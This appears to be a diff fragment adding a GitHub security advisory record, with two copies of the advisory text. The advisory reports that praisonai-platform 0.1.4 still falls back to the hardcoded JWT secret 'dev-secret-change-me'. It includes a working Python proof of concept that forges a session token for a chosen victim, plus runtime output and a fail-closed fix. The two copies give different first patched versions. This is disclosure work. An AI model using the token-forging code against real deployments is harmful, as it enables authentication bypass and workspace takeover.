+          "description": "- Affected: praisonai-platform (PyPI) <= 0.1.4 — including 0.1.4, the version GHSA-3qg8-5g3r-79v5 declares as the patch; main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c is also affected. File src/praisonai-platform/praisonai_platform/services/auth_service.py\n\n- CWE: CWE-1188 (Insecure Default Initialization) + CWE-798 (Use of Hard-coded Credentials) -> CWE-287 (Improper Authentication)\n\n## Overview\n\nGHSA-3qg8-5g3r-79v5 (Critical) reported that praisonai-platform's JWT signing secret defaulted to the hardcoded literal \"dev-secret-change-me\", and that the production guard meant to prevent this was default-open (it only fired when PLATFORM_ENV != \"dev\", but PLATFORM_ENV defaults to \"dev\"). That advisory declares the issue patched in >= 0.1.4. **It is not.** The shipped praisonai-platform==0.1.4 (and current main) still resolves the signing key to \"dev-secret-change-me\" in any deployment that does not explicitly set PLATFORM_JWT_SECRET, because the 0.1.4 change merely duplicated the same default-open guard into a second function instead of failing closed. An unauthenticated attacker reads the literal from the public source, forges a JWT with an arbitrary sub, and is authenticated as that user — including a workspace owner.\n\n## Impact\n\nAny deployment that runs praisonai-platform 0.1.4 without explicitly exporting a strong PLATFORM_JWT_SECRET signs and verifies session JWTs with the publicly known key \"dev-secret-change-me\". The package's documented entry point — `python -m praisonai_platform --host 0.0.0.0 --port 8000` (equivalently `uvicorn praisonai_platform.api.app:app --host 0.0.0.0`) — sets neither PLATFORM_JWT_SECRET nor PLATFORM_ENV, so this is the default state, not an edge case. A repository-wide search finds both variables only at the two guard sites and in test fixtures; no shipped Dockerfile, compose file, or deployment doc sets either.\n\nConsequences:\n\n- **Complete authentication bypass (unauthenticated).** Knowing only the public default secret read from source, an attacker mints HS256({\"sub\": <user id>, \"email\": …, \"exp\": <future>}, \"dev-secret-change-me\"). The platform's own verifier accepts it and returns an authenticated identity for the attacker-chosen sub — no account and no prior access required. This is the headline defect: the identical break GHSA-3qg8 was scored 9.8 for.\n\n- **Workspace-owner takeover (when a target owner's id is known).** Forging the sub of a workspace owner satisfies require_workspace_member / require_workspace_owner and the owner-gated routes, yielding owner-level read/update/delete of every resource in that workspace plus member/role management. uuid4 user ids are unguessable, so impersonating a specific owner additionally requires learning that owner's id — which any co-member can read directly from GET /{workspace_id}/members (returns List[MemberResponse], each carrying user_id and role, to any holder of require_workspace_member), and which also surfaces in logs and referrals. The end state matches the three Critical advisories of the 0.1.4 wave (this one, plus GHSA-c2m8-4gcg-v22g 9.6 and GHSA-h8q5-cp56-rr65).\n\n- **Resource destruction / lock-out (A:H).** Owner impersonation reaches DELETE /workspaces/{workspace_id} (gated by require_workspace_owner), which deletes the entire workspace and every contained resource, and DELETE /{workspace_id}/members/{user_id}, which evicts legitimate members — irrecoverable denial of the workspace to its rightful users.\n\n- **Affected population:** every default (no PLATFORM_JWT_SECRET) deployment of 0.1.4 — the version users upgrade to specifically because GHSA-3qg8 told them 0.1.4 is fixed.\n\nPR:N / AC:L apply to the authentication-bypass primitive: minting a valid session for a known sub needs no account, only the public secret. Targeted takeover of a specific owner additionally requires that owner's user id (readable by any co-member from the member-list response above, or recoverable from logs / prior exposure); this conditions the highest-impact path but not the bypass itself. The vector matches the PR:N/9.8 GitHub assigned the original GHSA-3qg8 for the identical defect.\n\n## Technical Details\n\nAll references are to src/praisonai-platform/praisonai_platform/... in praisonai-platform==0.1.4 (PyPI sdist) and main HEAD 8acf77c. The two copies of services/auth_service.py are byte-identical — sha256 = cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258 for both the shipped 0.1.4 sdist and the HEAD checkout — so the patched release and current main carry the same defect verbatim.\n\n**1. Module-load guard is default-open (services/auth_service.py:25-34).**\n\n```python\nDEFAULT_SECRET = \"dev-secret-change-me\"\nJWT_SECRET = os.environ.get(\"PLATFORM_JWT_SECRET\", DEFAULT_SECRET)\nJWT_ALGORITHM = \"HS256\"\nJWT_TTL_SECONDS = int(os.environ.get(\"PLATFORM_JWT_TTL\", str(30 * 24 * 3600)))\nif JWT_SECRET == DEFAULT_SECRET and os.environ.get(\"PLATFORM_ENV\", \"dev\") != \"dev\":\n    raise RuntimeError(\n        \"PLATFORM_JWT_SECRET must be set to a strong random value in production. \"\n        \"Set PLATFORM_ENV=dev to suppress this check during development.\"\n    )\n```\n\nThe raise fires only when PLATFORM_ENV != \"dev\". But os.environ.get(\"PLATFORM_ENV\", \"dev\") defaults to \"dev\", and PLATFORM_ENV is set nowhere in the package or its deployment configuration (a repo-wide search finds PLATFORM_ENV only at these two guard sites, and PLATFORM_JWT_SECRET only here plus in tests/ fixtures that set it explicitly — no Dockerfile, compose file, or doc sets either). So in a clean deployment the predicate is True and (\"dev\" != \"dev\") = False; the guard does not fire and JWT_SECRET stays \"dev-secret-change-me\".\n\n**2. The 0.1.4 \"fix\" duplicated the same default-open guard (services/auth_service.py:114-128).** Instead of failing closed, 0.1.4 added the identical predicate to _issue_token:\n\n```python\ndef _issue_token(self, user: User) -> str:\n    if JWT_SECRET == DEFAULT_SECRET and os.environ.get(\"PLATFORM_ENV\", \"dev\") != \"dev\":\n        raise RuntimeError(\"Refusing to issue JWT with default PLATFORM_JWT_SECRET outside dev\")\n    ...\n    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)   # signs with the default secret\n```\n\nGHSA-3qg8 states the intended fix is to \"fail-closed at import time when the secret is the default, regardless of any environment variable.\" HEAD does not do that; both guard copies remain gated on the PLATFORM_ENV != \"dev\" condition that is false by default. The advisory's own patch threshold (>= 0.1.4) is therefore incorrect — 0.1.4 is still vulnerable.\n\n**3. Verification trusts the forged sub end-to-end (services/auth_service.py:131-141 -> api/deps.py:28-73).**\n\n```python\ndef _verify_token(self, token):\n    payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])   # default secret; alg pinned; exp checked\n    return AuthIdentity(id=payload[\"sub\"], type=\"user\", email=payload.get(\"email\"), name=payload.get(\"name\"))\n```\n\nget_current_user (deps.py:28) returns this identity directly; require_workspace_member (deps.py:54) authorizes purely from member_svc.has_role(workspace_id, identity.id, min_role) against the forged sub. Decoding is otherwise sound (HS256 pinned, exp enforced by PyJWT, no verify=False), so the only break is the default secret. No middleware or app-factory check re-validates (api/app.py mounts the routers with per-route Depends(get_current_user) and no global re-root).\n\nThe cross-workspace IDOR (GHSA-h8q5-cp56-rr65) and member-role privilege-escalation (GHSA-c2m8-4gcg-v22g) fixes were reviewed at HEAD and appear complete; this advisory is specific to the JWT-secret guard.\n\n## Reproduction\n\npraisonai-platform is a Python server package, so the PoC is a self-contained Python reproducer that installs the shipped 0.1.4 release, simulates a default deployment (no env vars), forges a token with the public default secret, and feeds it to the package's own AuthService._verify_token.\n\n```bash\nmkdir poc && cd poc\npip install --target ./pkgs praisonai-platform==0.1.4 PyJWT\npython3 poc.py\n```\n\n```python\n# poc.py\nimport os, sys\nos.environ.pop(\"PLATFORM_JWT_SECRET\", None)   # default deployment: secret not set\nos.environ.pop(\"PLATFORM_ENV\", None)          # default deployment: env not set -> guard default-open\nsys.path.insert(0, \"./pkgs\")\n\nfrom datetime import datetime, timedelta, timezone\nimport jwt\n\nVICTIM_SUB = \"11111111-2222-4333-8444-deadbeefcafe\"   # a target user/owner uuid4\nnow = datetime.now(timezone.utc)\nforged = jwt.encode(\n    {\"sub\": VICTIM_SUB, \"email\": \"victim@target\", \"name\": \"victim\",\n     \"iat\": now, \"exp\": now + timedelta(hours=1)},\n    \"dev-secret-change-me\", algorithm=\"HS256\",       # the public hardcoded default\n)\n\nfrom praisonai_platform.services import auth_service as A\nprint(\"package JWT_SECRET (env unset) =\", repr(A.JWT_SECRET), \"| == default?\", A.JWT_SECRET == \"dev-secret-change-me\")\nidentity = A.AuthService.__new__(A.AuthService)._verify_token(forged)   # the package's own verifier\nprint(\"package _verify_token(forged) =\", identity)\nassert identity is not None and identity.id == VICTIM_SUB\nprint(\"RESULT: CONFIRMED — forged token accepted as victim\")\n```\n\n### End-to-end (runtime) verification\n\nObserved output, run against the actually-installed praisonai-platform==0.1.4 (the GHSA-3qg8 \"patched\" release):\n\n```text\npackage JWT_SECRET (env unset) = 'dev-secret-change-me' | == default? True\npackage _verify_token(forged) = AuthIdentity(id='11111111-2222-4333-8444-deadbeefcafe', type='user', workspace_id=None, roles=[], email='victim@target', name='victim', metadata={})\nRESULT: CONFIRMED — forged token accepted as victim\n```\n\nThis is the package's own _verify_token (not a re-implementation) returning an authenticated AuthIdentity for an attacker-chosen sub, proving end-to-end that 0.1.4 accepts forged sessions in a default deployment. The intermediate observation (the module-level JWT_SECRET equals the public default) and the final sink (the verifier returns the victim identity) were both observed at runtime.\n\n### Default-open contrast\n\nSetting only PLATFORM_ENV (still no PLATFORM_JWT_SECRET) makes the same guard fire at import — demonstrating that the only thing protecting a production deployment is an environment variable that defaults to the unsafe value:\n\n```bash\nPLATFORM_ENV=prod python3 -c \"import praisonai_platform.services.auth_service\"\n```\n\n```text\n  File \".../praisonai_platform/services/auth_service.py\", line 31, in <module>\n    raise RuntimeError(\nRuntimeError: PLATFORM_JWT_SECRET must be set to a strong random value in production. Set PLATFORM_ENV=dev to suppress this check during development.\n```\n\nThe guard can fail closed — it simply does not in the default (PLATFORM_ENV unset → \"dev\") state, which is exactly what GHSA-3qg8 reported and 0.1.4 left unchanged.\n\n## Suggested Fix\n\nFail closed, independent of PLATFORM_ENV:\n\n```python\nJWT_SECRET = os.environ.get(\"PLATFORM_JWT_SECRET\")\nif not JWT_SECRET:\n    raise RuntimeError(\"PLATFORM_JWT_SECRET must be set to a strong random value; refusing to start with a default key.\")\nif JWT_SECRET == \"dev-secret-change-me\":\n    raise RuntimeError(\"PLATFORM_JWT_SECRET is the well-known default; set a unique strong value.\")\n```\n\n- Remove the _DEFAULT_SECRET fallback entirely (no default signing key), or at minimum raise unconditionally when the secret is the default — do **not** gate that check on PLATFORM_ENV, whose default value (\"dev\") is precisely what disables the check.\n\n- Apply the same to the duplicated guard in _issue_token.\n\n- Consider generating a random per-process secret only for an explicit, clearly-flagged dev mode (e.g. PLATFORM_ENV=dev opt-in), so the safe default is fail-closed.\n\n## Disclosure Timeline\n\n- 2026-05-30: Discovered as an incomplete fix of GHSA-3qg8-5g3r-79v5 while auditing praisonai-platform at main HEAD 8acf77c. Runtime-confirmed against the shipped PyPI release praisonai-platform==0.1.4: a token forged with the public default secret is accepted by the package's own AuthService._verify_token.\n\n- 2026-05-30: Drafted for submission via GitHub Security Advisory (PraisonAI).\n\n## References\n\n- Original advisory (declares 0.1.4 patched): GHSA-3qg8-5g3r-79v5 — \"praisonai-platform: JWT signing key defaults to hardcoded dev-secret-change-me … when PLATFORM_ENV is unset\" (Critical, 9.8).\n\n- Affected source: src/praisonai-platform/praisonai_platform/services/auth_service.py:25-34 (module guard), :114-128 (_issue_token duplicate guard + sign), :130-141 (_verify_token); api/deps.py:28-73 (get_current_user, require_workspace_member); api/app.py (router mounting, no global auth re-root).\n\n- Shipped artifact verified: praisonai-platform==0.1.4 PyPI sdist (pyproject.toml:7 version = \"0.1.4\"); auth_service.py is byte-identical to main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c (sha256 cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258).\n\n- Sibling advisories from the same 0.1.4 wave (reviewed, fixes appear complete at HEAD): the wave closed three Critical advisories in total — this one (GHSA-3qg8-5g3r-79v5, 9.8) plus GHSA-c2m8-4gcg-v22g (member-role privilege escalation, 9.6) and GHSA-h8q5-cp56-rr65 (cross-workspace IDOR + role escalation) — alongside several High/Medium IDOR advisories.",
+          "ghsa_id": "GHSA-f38v-77qj-h4jq",
+          "github_reviewed_at": "2026-06-18T14:27:08Z",
+          "html_url": "https://github.com/advisories/GHSA-f38v-77qj-h4jq",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-f38v-77qj-h4jq"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-57148"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-06-18T14:27:08Z",
+          "references": [
+            "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-f38v-77qj-h4jq",
+            "https://github.com/advisories/GHSA-f38v-77qj-h4jq"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/MervinPraison/PraisonAI/security-advisories/GHSA-f38v-77qj-h4jq",
+          "severity": "critical",
+          "source_code_location": "https://github.com/MervinPraison/PraisonAI",
+          "summary": "praisonai-platform 0.1.4 still boots on the hardcoded JWT secret dev-secret-change-me (default-open production guard)",
+          "type": "reviewed",
+          "updated_at": "2026-07-20T21:28:42Z",
+          "url": "https://api.github.com/advisories/GHSA-f38v-77qj-h4jq",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "0.1.6",
+              "package": {
+                "ecosystem": "pip",
+                "name": "praisonai-platform"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 0.1.4"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "Yanchon918s",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/124195190?v=4",
+                "events_url": "https://api.github.com/users/Yanchon918s/events{/privacy}",
+                "followers_url": "https://api.github.com/users/Yanchon918s/followers",
+                "following_url": "https://api.github.com/users/Yanchon918s/following{/other_user}",
+                "gists_url": "https://api.github.com/users/Yanchon918s/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/Yanchon918s",
+                "id": 124195190,
+                "login": "Yanchon918s",
+                "node_id": "U_kgDOB2cRdg",
+                "organizations_url": "https://api.github.com/users/Yanchon918s/orgs",
+                "received_events_url": "https://api.github.com/users/Yanchon918s/received_events",
+                "repos_url": "https://api.github.com/users/Yanchon918s/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/Yanchon918s/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/Yanchon918s/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/Yanchon918s",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-57148",
+          "cvss": {
+            "score": 9.8,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 9.8,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-287",
+            "CWE-798",
+            "CWE-1188"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-287",
+              "name": "Improper Authentication"
+            },
+            {
+              "cwe_id": "CWE-798",
+              "name": "Use of Hard-coded Credentials"
+            },
+            {
+              "cwe_id": "CWE-1188",
+              "name": "Initialization of a Resource with an Insecure Default"
+            }
+          ],
+          "description": "- Affected: praisonai-platform (PyPI) <= 0.1.4 — including 0.1.4, the version GHSA-3qg8-5g3r-79v5 declares as the patch; main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c is also affected. File src/praisonai-platform/praisonai_platform/services/auth_service.py\r\n\r\n- CWE: CWE-1188 (Insecure Default Initialization) + CWE-798 (Use of Hard-coded Credentials) -> CWE-287 (Improper Authentication)\r\n\r\n## Overview\r\n\r\nGHSA-3qg8-5g3r-79v5 (Critical) reported that praisonai-platform's JWT signing secret defaulted to the hardcoded literal \"dev-secret-change-me\", and that the production guard meant to prevent this was default-open (it only fired when PLATFORM_ENV != \"dev\", but PLATFORM_ENV defaults to \"dev\"). That advisory declares the issue patched in >= 0.1.4. **It is not.** The shipped praisonai-platform==0.1.4 (and current main) still resolves the signing key to \"dev-secret-change-me\" in any deployment that does not explicitly set PLATFORM_JWT_SECRET, because the 0.1.4 change merely duplicated the same default-open guard into a second function instead of failing closed. An unauthenticated attacker reads the literal from the public source, forges a JWT with an arbitrary sub, and is authenticated as that user — including a workspace owner.\r\n\r\n## Impact\r\n\r\nAny deployment that runs praisonai-platform 0.1.4 without explicitly exporting a strong PLATFORM_JWT_SECRET signs and verifies session JWTs with the publicly known key \"dev-secret-change-me\". The package's documented entry point — `python -m praisonai_platform --host 0.0.0.0 --port 8000` (equivalently `uvicorn praisonai_platform.api.app:app --host 0.0.0.0`) — sets neither PLATFORM_JWT_SECRET nor PLATFORM_ENV, so this is the default state, not an edge case. A repository-wide search finds both variables only at the two guard sites and in test fixtures; no shipped Dockerfile, compose file, or deployment doc sets either.\r\n\r\nConsequences:\r\n\r\n- **Complete authentication bypass (unauthenticated).** Knowing only the public default secret read from source, an attacker mints HS256({\"sub\": <user id>, \"email\": …, \"exp\": <future>}, \"dev-secret-change-me\"). The platform's own verifier accepts it and returns an authenticated identity for the attacker-chosen sub — no account and no prior access required. This is the headline defect: the identical break GHSA-3qg8 was scored 9.8 for.\r\n\r\n- **Workspace-owner takeover (when a target owner's id is known).** Forging the sub of a workspace owner satisfies require_workspace_member / require_workspace_owner and the owner-gated routes, yielding owner-level read/update/delete of every resource in that workspace plus member/role management. uuid4 user ids are unguessable, so impersonating a specific owner additionally requires learning that owner's id — which any co-member can read directly from GET /{workspace_id}/members (returns List[MemberResponse], each carrying user_id and role, to any holder of require_workspace_member), and which also surfaces in logs and referrals. The end state matches the three Critical advisories of the 0.1.4 wave (this one, plus GHSA-c2m8-4gcg-v22g 9.6 and GHSA-h8q5-cp56-rr65).\r\n\r\n- **Resource destruction / lock-out (A:H).** Owner impersonation reaches DELETE /workspaces/{workspace_id} (gated by require_workspace_owner), which deletes the entire workspace and every contained resource, and DELETE /{workspace_id}/members/{user_id}, which evicts legitimate members — irrecoverable denial of the workspace to its rightful users.\r\n\r\n- **Affected population:** every default (no PLATFORM_JWT_SECRET) deployment of 0.1.4 — the version users upgrade to specifically because GHSA-3qg8 told them 0.1.4 is fixed.\r\n\r\nPR:N / AC:L apply to the authentication-bypass primitive: minting a valid session for a known sub needs no account, only the public secret. Targeted takeover of a specific owner additionally requires that owner's user id (readable by any co-member from the member-list response above, or recoverable from logs / prior exposure); this conditions the highest-impact path but not the bypass itself. The vector matches the PR:N/9.8 GitHub assigned the original GHSA-3qg8 for the identical defect.\r\n\r\n## Technical Details\r\n\r\nAll references are to src/praisonai-platform/praisonai_platform/... in praisonai-platform==0.1.4 (PyPI sdist) and main HEAD 8acf77c. The two copies of services/auth_service.py are byte-identical — sha256 = cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258 for both the shipped 0.1.4 sdist and the HEAD checkout — so the patched release and current main carry the same defect verbatim.\r\n\r\n**1. Module-load guard is default-open (services/auth_service.py:25-34).**\r\n\r\n```python\r\nDEFAULT_SECRET = \"dev-secret-change-me\"\r\nJWT_SECRET = os.environ.get(\"PLATFORM_JWT_SECRET\", DEFAULT_SECRET)\r\nJWT_ALGORITHM = \"HS256\"\r\nJWT_TTL_SECONDS = int(os.environ.get(\"PLATFORM_JWT_TTL\", str(30 * 24 * 3600)))\r\nif JWT_SECRET == DEFAULT_SECRET and os.environ.get(\"PLATFORM_ENV\", \"dev\") != \"dev\":\r\n    raise RuntimeError(\r\n        \"PLATFORM_JWT_SECRET must be set to a strong random value in production. \"\r\n        \"Set PLATFORM_ENV=dev to suppress this check during development.\"\r\n    )\r\n```\r\n\r\nThe raise fires only when PLATFORM_ENV != \"dev\". But os.environ.get(\"PLATFORM_ENV\", \"dev\") defaults to \"dev\", and PLATFORM_ENV is set nowhere in the package or its deployment configuration (a repo-wide search finds PLATFORM_ENV only at these two guard sites, and PLATFORM_JWT_SECRET only here plus in tests/ fixtures that set it explicitly — no Dockerfile, compose file, or doc sets either). So in a clean deployment the predicate is True and (\"dev\" != \"dev\") = False; the guard does not fire and JWT_SECRET stays \"dev-secret-change-me\".\r\n\r\n**2. The 0.1.4 \"fix\" duplicated the same default-open guard (services/auth_service.py:114-128).** Instead of failing closed, 0.1.4 added the identical predicate to _issue_token:\r\n\r\n```python\r\ndef _issue_token(self, user: User) -> str:\r\n    if JWT_SECRET == DEFAULT_SECRET and os.environ.get(\"PLATFORM_ENV\", \"dev\") != \"dev\":\r\n        raise RuntimeError(\"Refusing to issue JWT with default PLATFORM_JWT_SECRET outside dev\")\r\n    ...\r\n    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)   # signs with the default secret\r\n```\r\n\r\nGHSA-3qg8 states the intended fix is to \"fail-closed at import time when the secret is the default, regardless of any environment variable.\" HEAD does not do that; both guard copies remain gated on the PLATFORM_ENV != \"dev\" condition that is false by default. The advisory's own patch threshold (>= 0.1.4) is therefore incorrect — 0.1.4 is still vulnerable.\r\n\r\n**3. Verification trusts the forged sub end-to-end (services/auth_service.py:131-141 -> api/deps.py:28-73).**\r\n\r\n```python\r\ndef _verify_token(self, token):\r\n    payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])   # default secret; alg pinned; exp checked\r\n    return AuthIdentity(id=payload[\"sub\"], type=\"user\", email=payload.get(\"email\"), name=payload.get(\"name\"))\r\n```\r\n\r\nget_current_user (deps.py:28) returns this identity directly; require_workspace_member (deps.py:54) authorizes purely from member_svc.has_role(workspace_id, identity.id, min_role) against the forged sub. Decoding is otherwise sound (HS256 pinned, exp enforced by PyJWT, no verify=False), so the only break is the default secret. No middleware or app-factory check re-validates (api/app.py mounts the routers with per-route Depends(get_current_user) and no global re-root).\r\n\r\nThe cross-workspace IDOR (GHSA-h8q5-cp56-rr65) and member-role privilege-escalation (GHSA-c2m8-4gcg-v22g) fixes were reviewed at HEAD and appear complete; this advisory is specific to the JWT-secret guard.\r\n\r\n## Reproduction\r\n\r\npraisonai-platform is a Python server package, so the PoC is a self-contained Python reproducer that installs the shipped 0.1.4 release, simulates a default deployment (no env vars), forges a token with the public default secret, and feeds it to the package's own AuthService._verify_token.\r\n\r\n```bash\r\nmkdir poc && cd poc\r\npip install --target ./pkgs praisonai-platform==0.1.4 PyJWT\r\npython3 poc.py\r\n```\r\n\r\n```python\r\n# poc.py\r\nimport os, sys\r\nos.environ.pop(\"PLATFORM_JWT_SECRET\", None)   # default deployment: secret not set\r\nos.environ.pop(\"PLATFORM_ENV\", None)          # default deployment: env not set -> guard default-open\r\nsys.path.insert(0, \"./pkgs\")\r\n\r\nfrom datetime import datetime, timedelta, timezone\r\nimport jwt\r\n\r\nVICTIM_SUB = \"11111111-2222-4333-8444-deadbeefcafe\"   # a target user/owner uuid4\r\nnow = datetime.now(timezone.utc)\r\nforged = jwt.encode(\r\n    {\"sub\": VICTIM_SUB, \"email\": \"victim@target\", \"name\": \"victim\",\r\n     \"iat\": now, \"exp\": now + timedelta(hours=1)},\r\n    \"dev-secret-change-me\", algorithm=\"HS256\",       # the public hardcoded default\r\n)\r\n\r\nfrom praisonai_platform.services import auth_service as A\r\nprint(\"package JWT_SECRET (env unset) =\", repr(A.JWT_SECRET), \"| == default?\", A.JWT_SECRET == \"dev-secret-change-me\")\r\nidentity = A.AuthService.__new__(A.AuthService)._verify_token(forged)   # the package's own verifier\r\nprint(\"package _verify_token(forged) =\", identity)\r\nassert identity is not None and identity.id == VICTIM_SUB\r\nprint(\"RESULT: CONFIRMED — forged token accepted as victim\")\r\n```\r\n\r\n### End-to-end (runtime) verification\r\n\r\nObserved output, run against the actually-installed praisonai-platform==0.1.4 (the GHSA-3qg8 \"patched\" release):\r\n\r\n```text\r\npackage JWT_SECRET (env unset) = 'dev-secret-change-me' | == default? True\r\npackage _verify_token(forged) = AuthIdentity(id='11111111-2222-4333-8444-deadbeefcafe', type='user', workspace_id=None, roles=[], email='victim@target', name='victim', metadata={})\r\nRESULT: CONFIRMED — forged token accepted as victim\r\n```\r\n\r\nThis is the package's own _verify_token (not a re-implementation) returning an authenticated AuthIdentity for an attacker-chosen sub, proving end-to-end that 0.1.4 accepts forged sessions in a default deployment. The intermediate observation (the module-level JWT_SECRET equals the public default) and the final sink (the verifier returns the victim identity) were both observed at runtime.\r\n\r\n### Default-open contrast\r\n\r\nSetting only PLATFORM_ENV (still no PLATFORM_JWT_SECRET) makes the same guard fire at import — demonstrating that the only thing protecting a production deployment is an environment variable that defaults to the unsafe value:\r\n\r\n```bash\r\nPLATFORM_ENV=prod python3 -c \"import praisonai_platform.services.auth_service\"\r\n```\r\n\r\n```text\r\n  File \".../praisonai_platform/services/auth_service.py\", line 31, in <module>\r\n    raise RuntimeError(\r\nRuntimeError: PLATFORM_JWT_SECRET must be set to a strong random value in production. Set PLATFORM_ENV=dev to suppress this check during development.\r\n```\r\n\r\nThe guard can fail closed — it simply does not in the default (PLATFORM_ENV unset → \"dev\") state, which is exactly what GHSA-3qg8 reported and 0.1.4 left unchanged.\r\n\r\n## Suggested Fix\r\n\r\nFail closed, independent of PLATFORM_ENV:\r\n\r\n```python\r\nJWT_SECRET = os.environ.get(\"PLATFORM_JWT_SECRET\")\r\nif not JWT_SECRET:\r\n    raise RuntimeError(\"PLATFORM_JWT_SECRET must be set to a strong random value; refusing to start with a default key.\")\r\nif JWT_SECRET == \"dev-secret-change-me\":\r\n    raise RuntimeError(\"PLATFORM_JWT_SECRET is the well-known default; set a unique strong value.\")\r\n```\r\n\r\n- Remove the _DEFAULT_SECRET fallback entirely (no default signing key), or at minimum raise unconditionally when the secret is the default — do **not** gate that check on PLATFORM_ENV, whose default value (\"dev\") is precisely what disables the check.\r\n\r\n- Apply the same to the duplicated guard in _issue_token.\r\n\r\n- Consider generating a random per-process secret only for an explicit, clearly-flagged dev mode (e.g. PLATFORM_ENV=dev opt-in), so the safe default is fail-closed.\r\n\r\n## Disclosure Timeline\r\n\r\n- 2026-05-30: Discovered as an incomplete fix of GHSA-3qg8-5g3r-79v5 while auditing praisonai-platform at main HEAD 8acf77c. Runtime-confirmed against the shipped PyPI release praisonai-platform==0.1.4: a token forged with the public default secret is accepted by the package's own AuthService._verify_token.\r\n\r\n- 2026-05-30: Drafted for submission via GitHub Security Advisory (PraisonAI).\r\n\r\n## References\r\n\r\n- Original advisory (declares 0.1.4 patched): GHSA-3qg8-5g3r-79v5 — \"praisonai-platform: JWT signing key defaults to hardcoded dev-secret-change-me … when PLATFORM_ENV is unset\" (Critical, 9.8).\r\n\r\n- Affected source: src/praisonai-platform/praisonai_platform/services/auth_service.py:25-34 (module guard), :114-128 (_issue_token duplicate guard + sign), :130-141 (_verify_token); api/deps.py:28-73 (get_current_user, require_workspace_member); api/app.py (router mounting, no global auth re-root).\r\n\r\n- Shipped artifact verified: praisonai-platform==0.1.4 PyPI sdist (pyproject.toml:7 version = \"0.1.4\"); auth_service.py is byte-identical to main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c (sha256 cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258).\r\n\r\n- Sibling advisories from the same 0.1.4 wave (reviewed, fixes appear complete at HEAD): the wave closed three Critical advisories in total — this one (GHSA-3qg8-5g3r-79v5, 9.8) plus GHSA-c2m8-4gcg-v22g (member-role privilege escalation, 9.6) and GHSA-h8q5-cp56-rr65 (cross-workspace IDOR + role escalation) — alongside several High/Medium IDOR advisories.",
+          "ghsa_id": "GHSA-f38v-77qj-h4jq",
+          "html_url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-f38v-77qj-h4jq",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-f38v-77qj-h4jq"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-57148"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-06-17T09:57:26Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/454862?v=4",
+            "events_url": "https://api.github.com/users/MervinPraison/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MervinPraison/followers",
+            "following_url": "https://api.github.com/users/MervinPraison/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MervinPraison/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MervinPraison",
+            "id": 454862,
+            "login": "MervinPraison",
+            "node_id": "MDQ6VXNlcjQ1NDg2Mg==",
+            "organizations_url": "https://api.github.com/users/MervinPraison/orgs",
+            "received_events_url": "https://api.github.com/users/MervinPraison/received_events",
+            "repos_url": "https://api.github.com/users/MervinPraison/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MervinPraison/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MervinPraison/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MervinPraison",
+            "user_view_type": "public"
+          },
+          "severity": "critical",
+          "state": "published",
+          "submission": null,
+          "summary": "Incomplete fix of GHSA-3qg8: praisonai-platform 0.1.4 still boots on the hardcoded JWT secret dev-secret-change-me (default-open production guard)",
+          "updated_at": "2026-06-24T01:49:01Z",
+          "url": "https://api.github.com/repos/MervinPraison/PraisonAI/security-advisories/GHSA-f38v-77qj-h4jq",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "pip",
+                "name": "praisonai-platform"
+              },
+              "patched_versions": ">= 0.1.5",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 0.1.4"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "MervinPraison/PraisonAI",
+    "selected_fixes": [
+      "e0fb8e7dd1ee6759c18ed07f436c21dbd9c20747"
+    ]
+  }
+}
